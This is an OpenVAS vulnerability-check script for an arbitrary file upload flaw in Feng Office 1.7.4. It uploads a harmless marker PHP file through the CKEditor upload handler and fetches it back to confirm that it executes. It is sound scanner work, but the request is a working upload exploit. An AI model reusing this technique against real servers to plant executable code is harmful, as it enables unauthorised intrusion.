###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_feng_office_47049.nasl 13 2013-10-27 12:16:33Z jan $
#
# Feng Office Arbitrary File Upload and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Feng Office is prone to an arbitrary-file-upload vulnerability and
multiple cross-site scripting vulnerabilities because the application
fails to sufficiently sanitize user-supplied input.

Attackers can exploit these issues to upload and execute arbitrary PHP
shell code in the context of the webserver process, steal cookie-based
authentication information, execute arbitrary client-side scripts in
the context of the browser, and obtain sensitive information. Other
attacks are also possible.

Feng Office 1.7.4 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103133);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-03-28 19:09:51 +0200 (Mon, 28 Mar 2011)");
 script_bugtraq_id(47049);
 script_tag(name:"cvss_base", value:"4.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
 script_name("Feng Office Arbitrary File Upload and Cross Site Scripting Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/47049");
 script_xref(name : "URL" , value : "http://www.fengoffice.com/web/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if Feng Office is prone to an arbitrary-file-upload vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/feng_community", cgi_dirs());

foreach dir (dirs) {

  rand = rand();
  url = string(dir, "/public/assets/javascript/ckeditor/ck_upload_handler.php"); 
  file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php");
  len = 175 + strlen(file);

  req = string(  
    "POST ", url, " HTTP/1.1\r\n",
    "Content-Type: multipart/form-data; boundary=----x\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Length: ",len,"\r\n",
    "Accept: text/html\r\n",
    "Accept-Encoding: gzip,deflate,sdch\r\n" ,
    "Accept-Language: en-US,en;q=0.8\r\n",
    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n",
    "------x\r\n",
    'Content-Disposition: form-data; name="imagefile"; filename="',file,'"',"\r\n",
    "Content-Type: application/octet-stream\r\n\r\n",
    "<?php echo '<pre>OpenVAS-Upload-Test</pre>'; ?>","\r\n",
    "------x--\r\n\r\n");

    recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);

    if(file >< recv) {
      
      file_string = eregmatch(pattern:"/([0-9]+" + file + ")'", string: recv);
      if(isnull(file_string[1]))exit(0);

      url = dir + '/tmp/' + file_string[1];
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

      if("<pre>OpenVAS-Upload-Test</pre>" >< buf) {

      security_hole(port:port);
      exit(0);
    }    
  }
}

exit(0);
